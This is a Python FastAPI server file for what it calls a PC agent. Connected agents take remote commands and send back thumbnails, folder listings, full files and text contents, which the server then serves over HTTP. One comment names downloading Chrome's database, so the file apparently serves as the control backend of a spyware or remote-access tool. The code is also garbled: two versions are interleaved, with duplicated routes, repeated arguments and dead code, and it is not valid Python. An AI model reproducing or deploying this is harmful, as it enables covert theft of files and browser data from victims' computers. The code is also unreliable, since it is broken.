import base64
import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from typing import List, Dict, Any
from urllib.parse import unquote

app = FastAPI(title="Agente PC - Backend (Explorador Total)")
app = FastAPI(title="Agente PC - Servidor Central Pro")

# Configuración de CORS para que el Panel de Control pueda comunicarse
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str; action: str; payload: str = ""
    target_id: str
    action: str
    payload: str = ""

class Thumbnail(BaseModel):
    filename: str; filepath: str; small_thumb_b64: str
    filename: str
    small_thumb_b64: str
    filepath: str

class ThumbnailChunk(BaseModel):
    thumbnails: List[Thumbnail]; is_final_chunk: bool
class FileSystemItem(BaseModel):
    name: str; type: str; path: str
class DirectoryListingChunk(BaseModel):
    path: str; items: List[FileSystemItem]; is_final_chunk: bool
    thumbnails: List[Thumbnail]
    is_final_chunk: bool

class DirectoryListing(BaseModel):
    current_path: str
    folders: List[str]
    files: List[str]

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, Dict[str, Any]] = {}
device_media_cache: Dict[str, Dict[str, Any]] = {}
fetch_status: Dict[str, str] = {}
explorer_cache: Dict[str, List[Dict[str, str]]] = {}
explorer_status: Dict[str, str] = {}
# Cachés para el explorador
directory_cache: Dict[str, Dict[str, Any]] = {}
file_content_cache: Dict[str, str] = {}

# --- ENDPOINTS ---

@app.get("/")
async def root(): return {"message": "Servidor del Agente de PC activo."}
async def root():
    return {"status": "online", "message": "Servidor PC-AGENT activo"}

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    device_name_decoded = unquote(device_name); await websocket.accept()
    print(f"[PC-AGENT] Conectado: '{device_name_decoded}'")
    connected_agents[device_id] = {"ws": websocket, "name": device_name_decoded}
    await websocket.accept()
    name = unquote(device_name)
    print(f"[CONEXIÓN] Agente PC conectado: {name}")
    connected_agents[device_id] = {"ws": websocket, "name": name}
    try:
        while True: await websocket.receive_text()
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        print(f"[PC-AGENT] Desconectado: '{connected_agents.get(device_id, {}).get('name')}'")
        print(f"[DESCONEXIÓN] Agente PC desconectado: {name}")
        if device_id in connected_agents: del connected_agents[device_id]
        if device_id in device_media_cache: del device_media_cache[device_id]
        if device_id in fetch_status: del fetch_status[device_id]
        if device_id in explorer_cache: del explorer_cache[device_id]
        if device_id in explorer_status: del explorer_status[device_id]

@app.get("/api/get-agents")
async def get_agents():
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]
    return [{"id": d_id, "name": data["name"]} for d_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    agent = connected_agents.get(command.target_id)
    if not agent: return {"status": "error", "message": "Agente no conectado"}
    if not agent:
        return {"status": "error", "message": "Agente no conectado"}
    
    # Reiniciar estados según la acción
    if command.action == "get_thumbnails":
        device_media_cache[command.target_id] = {}; fetch_status[command.target_id] = "loading"
    if command.action == "list_directory":
        explorer_cache[command.target_id] = []; explorer_status[command.target_id] = "loading"
        device_media_cache[command.target_id] = {}
        fetch_status[command.target_id] = "loading"
    
    try:
        await agent["ws"].send_text(command.json())
        return {"status": "success", "message": "Comando enviado"}
    except Exception as e: return {"status": "error", "message": str(e)}
        return {"status": "success"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

# --- MANEJO DE MEDIOS (FOTOS/VIDEOS) ---

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
    if device_id not in device_media_cache: device_media_cache[device_id] = {}
    if device_id not in device_media_cache:
        device_media_cache[device_id] = {}
    for thumb in chunk.thumbnails:
        device_media_cache[device_id][thumb.filename] = thumb.dict()
    if chunk.is_final_chunk: fetch_status[device_id] = "complete"
    return {"status": "chunk received"}

@app.post("/api/submit_directory_listing/{device_id}")
async def submit_directory_listing(device_id: str, chunk: DirectoryListingChunk):
    if device_id not in explorer_cache: explorer_cache[device_id] = []
    explorer_cache[device_id].extend([item.dict() for item in chunk.items])
    if chunk.is_final_chunk: explorer_status[device_id] = "complete"
    return {"status": "listing chunk received"}
    if chunk.is_final_chunk:
        fetch_status[device_id] = "complete"
    return {"status": "ok"}

@app.get("/api/get_directory_listing/{device_id}")
async def get_directory_listing(device_id: str):
    status = explorer_status.get(device_id, "complete")
    items = explorer_cache.get(device_id, [])
    return {"status": status, "items": items}
@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    return {
        "status": fetch_status.get(device_id, "complete"),
        "thumbnails": device_media_cache.get(device_id, {})
    }

@app.post("/api/upload_original_file/{device_id}/{filename:path}")
async def upload_original_file(device_id: str, filename: str, file: UploadFile = File(...)):
    decoded_filename = unquote(filename)
    # Creamos la entrada en la caché si no existe (importante para el explorador)
    if device_id not in device_media_cache: device_media_cache[device_id] = {}
    if decoded_filename not in device_media_cache[device_id]:
        device_media_cache[device_id][decoded_filename] = {}
    name = unquote(filename)
    if device_id not in device_media_cache:
        device_media_cache[device_id] = {}
    
    # Crear la entrada si no existe
    if name not in device_media_cache[device_id]:
        device_media_cache[device_id][name] = {"filename": name}

    file_bytes = await file.read()
    original_b64 = base64.b64encode(file_bytes).decode('utf-8')
    device_media_cache[device_id][decoded_filename]['original_b64'] = original_b64
    print(f"Recibido archivo original '{decoded_filename}' de {device_id[:8]}.")
    device_media_cache[device_id][name]['original_b64'] = base64.b64encode(file_bytes).decode('utf-8')
    return {"status": "success"}

@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    status = fetch_status.get(device_id, "complete")
    thumbnails = device_media_cache.get(device_id, {})
    return {"status": status, "thumbnails": thumbnails}

@app.get("/media/{device_id}/{filename:path}")
async def get_large_media(device_id: str, filename: str):
    decoded_filename = unquote(filename)
    cache = device_media_cache.get(device_id, {})
    media_item = cache.get(decoded_filename)
    name = unquote(filename)
    item = device_media_cache.get(device_id, {}).get(name)

    if not media_item or 'original_b64' not in media_item:
        return Response(content='{"detail":"Archivo original no disponible"}', status_code=404, media_type="application/json")
    if not item or 'original_b64' not in item:
        return Response(content='{"detail":"Archivo no disponible todavía"}', status_code=404, media_type="application/json")

    try:
        # Decodificamos los bytes del archivo original
        file_bytes = base64.b64decode(media_item['original_b64'])
        
        # --- LÓGICA INTELIGENTE DE TIPO DE ARCHIVO ---
        fn_lower = decoded_filename.lower()
        
        if fn_lower.endswith(('.jpg', '.jpeg')):
            media_type = "image/jpeg"
        elif fn_lower.endswith('.png'):
            media_type = "image/png"
        elif fn_lower.endswith('.mp4'):
            media_type = "video/mp4"
        elif fn_lower.endswith('.txt'):
            media_type = "text/plain; charset=utf-8" # Para ver tus notas directamente
        elif fn_lower.endswith('.db'):
            media_type = "application/octet-stream" # Para descargar la base de datos de Chrome
        else:
            media_type = "application/octet-stream"
            
        return Response(content=file_bytes, media_type=media_type)
        
    except Exception as e:
        return Response(content=f'{{"detail":"Error: {e}"}}', status_code=500, media_type="application/json")
    file_bytes = base64.b64decode(item['original_b64'])
    fn_lower = name.lower()
    
    # Determinar tipo de archivo para el navegador
    if fn_lower.endswith(('.jpg', '.jpeg')): m_type = "image/jpeg"
    elif fn_lower.endswith('.png'): m_type = "image/png"
    elif fn_lower.endswith(('.mp4', '.mkv', '.avi', '.mov')): m_type = "video/mp4"
    elif fn_lower.endswith('.txt'): m_type = "text/plain; charset=utf-8"
    else: m_type = "application/octet-stream"
    
    return Response(content=file_bytes, media_type=m_type)

# --- MANEJO DE EXPLORADOR DE CARPETAS ---

@app.post("/api/submit_directory_listing/{device_id}")
async def submit_directory_listing(device_id: str, listing: DirectoryListing):
    directory_cache[device_id] = listing.dict()
    return {"status": "ok"}

@app.get("/api/get_directory_listing/{device_id}")
async def get_directory_listing(device_id: str):
    return directory_cache.get(device_id, {"current_path": "Raíz", "folders": [], "files": []})

@app.post("/api/submit_file_content/{device_id}")
async def submit_file_content(device_id: str, data: dict):
    file_content_cache[device_id] = data.get("content", "")
    return {"status": "ok"}

@app.get("/view_text/{device_id}")
async def view_text(device_id: str):
    content = file_content_cache.get(device_id, "El archivo está vacío o no se ha leído.")
    return Response(content=content, media_type="text/plain; charset=utf-8")
